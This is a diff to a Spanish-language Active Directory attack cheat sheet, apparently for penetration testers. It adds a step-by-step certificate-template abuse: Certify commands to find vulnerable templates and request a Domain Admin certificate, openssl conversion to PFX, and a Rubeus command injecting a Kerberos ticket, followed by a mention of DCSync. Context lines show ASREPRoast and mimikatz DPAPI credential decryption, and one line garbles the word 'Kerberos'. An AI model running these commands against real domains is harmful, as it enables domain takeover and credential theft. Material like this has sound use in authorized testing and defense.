@@ -11,9 +11,63 @@ banner:
   alt: "Active Directory"
 ---
 
+## Active Directory Certificate Services
+
+Compruebe si hay plantillas de certificado vulnerables con: Certify
+
+```shell
+.\Certify.exe find /vulnerable /quiet
+```
+Asegúrese de que el valor de `msPKI-Certificates-Name-Flag` esté establecido en `"ENROLLEE_SUPPLIES_SUBJECT"` y que los derechos de inscripción permitan usuarios de dominio/autenticados. Además, compruebe que el parámetro `pkiextendedkeyusage` contenga el valor `"Client Authentication"` y que el parámetro `"Authorized Signatures Required"` esté establecido en `0`.
+
+Este exploit solo funciona porque estas configuraciones habilitan la autenticación de servidor/cliente, lo que significa que un atacante puede especificar el UPN de un administrador de dominio ("DA") y usar el certificado capturado con Rubeus para falsificar la autenticación.
+
+Nota: Si un administrador de dominio pertenece a un grupo de usuarios protegidos, es posible que el exploit no funcione correctamente. Verifique antes de elegir un DA como objetivo.
+
+Solicitar el Certificado de Cuenta del DA con Certify
+
+```shell
+.\Certify.exe request /template:<Template Name> /quiet /ca:"<CA Name>" /domain:<domain.com> /path:CN=Configuration,DC=<domain>,DC=com /altname:<Domain Admin AltName> /machine
+```
+Esto debería devolver un certificado válido para la cuenta DA asociada.
+
+Los archivos exportados `cert.pem` y `cert.key` deben consolidarse en un solo archivo `cert.pem`, con un espacio en blanco entre el `END RSA PRIVATE KEY` y el `BEGIN CERTIFICATE`.
+ 
+Ejemplo de `cert.pem`:
+
+```shell
+-----BEGIN RSA PRIVATE KEY-----
+BIIEogIBAAk15x0ID[...]
+[...]
+[...]
+-----END RSA PRIVATE KEY-----
+
+-----BEGIN CERTIFICATE-----
+BIIEogIBOmgAwIbSe[...]
+[...]
+[...]
+-----END CERTIFICATE-----
+```
+Utilizar `openssl` para convertir al formato PKCS #12
+
+El comando `openssl` se puede utilizar para convertir el archivo de certificado al formato PKCS #12 (es posible que se le solicite ingresar una contraseña de exportación, que puede ser cualquier otra que desee).
+
+```shell
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+Una vez que se haya exportado el archivo `cert.pfx`, cárguelo en el host comprometido (esto se puede hacer de diferentes maneras, como con Powershell, SMB, certutil.exe, etc.)
+
+Una vez cargado el archivo `cert.pfx` en el host comprometido, se puede usar `Rubeus` para solicitar un TGT de Kerberos para la cuenta DA que luego se importará a la memoria.
+
+```shell
+.\Rubeus.exe asktgt /user:<Domain Admin AltName> /domain:<domain.com> /dc:<Domain Controller IP or Hostname> /certificate:<Local Machine Path to cert.pfx> /nowrap /ptt
+```
+Esto debería generar un ticket importado exitosamente, que luego le permite a un atacante realizar varias actividades maliciosas bajo el contexto de usuario DA, como realizar un ataque DCSync.
+
 ## ASREPRast
 
-Si una cuenta de usuario de dominio no requiere autenticación previa de Kerberos, podemos solicitar un TGT válido para esta cuenta sin siquiera tener credenciales de dominio, extraer el
+Si una cuenta de usuario de dominio no requiere autenticación previa de Kerbea
+ros, podemos solicitar un TGT válido para esta cuenta sin siquiera tener credenciales de dominio, extraer el
 blob cifrado y ejecutarlo por fuerza bruta sin conexión.
 
 - PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
@@ -121,3 +175,5 @@ dpapi::cache
 #Finally we can decrypt the credential using the cached masterkey:
 dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
 ```
+
+
